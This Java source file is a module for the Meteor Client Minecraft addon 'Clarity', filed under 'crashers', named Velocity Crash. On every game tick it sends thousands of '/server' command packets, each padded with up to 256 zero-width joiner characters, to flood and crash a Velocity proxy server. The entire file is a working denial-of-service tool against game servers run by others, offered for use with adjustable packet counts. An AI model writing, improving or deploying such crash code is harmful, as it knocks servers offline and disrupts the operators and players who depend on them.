package com.x310.clarity.modules.crashers;

import com.x310.clarity.Main;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

public class VelocityCrash extends Module {
    private final SettingGroup sg = settings.createGroup("Velocity");

    private final Setting<Boolean> disableOnLeave = sg.add(new BoolSetting.Builder()
        .name("disable-on-leave")
        .description("Disables spam when you leave a server.")
        .defaultValue(true)
        .build()
    );

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnLeave.get()) {
            toggle();
        }
    }

    private final Setting<String> serverName = sg.add(new StringSetting.Builder()
        .name("VeloWorld")
        .description("Do /server to find the world you're currently in")
        .defaultValue("lobby")
        .build()
    );

    private final Setting<Integer> amount = sg.add(new IntSetting.Builder()
        .name("Amount")
        .description("Packets every tick.")
        .defaultValue(10000)
        .min(1)
        .max(250000)
        .sliderMax(250000)
        .build()
    );

    private final Setting<Integer> buffer = sg.add(new IntSetting.Builder()
        .name("Buffer")
        .description("Buffer length.")
        .defaultValue(200)
        .min(0)
        .max(256)
        .sliderMax(256)
        .build()
    );

    public VelocityCrash() {
        super(Main.CRASH_GROUP, "Velocity Crash", "Spams server switch command.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        ClientPlayNetworkHandler handler = mc.getNetworkHandler();
        String spam = "server " + serverName.get() + " " + "\u200D".repeat(buffer.get());

        for (int i = 0; i < amount.get(); i++) {
            handler.sendPacket(new CommandExecutionC2SPacket(spam));
        }
    }
}
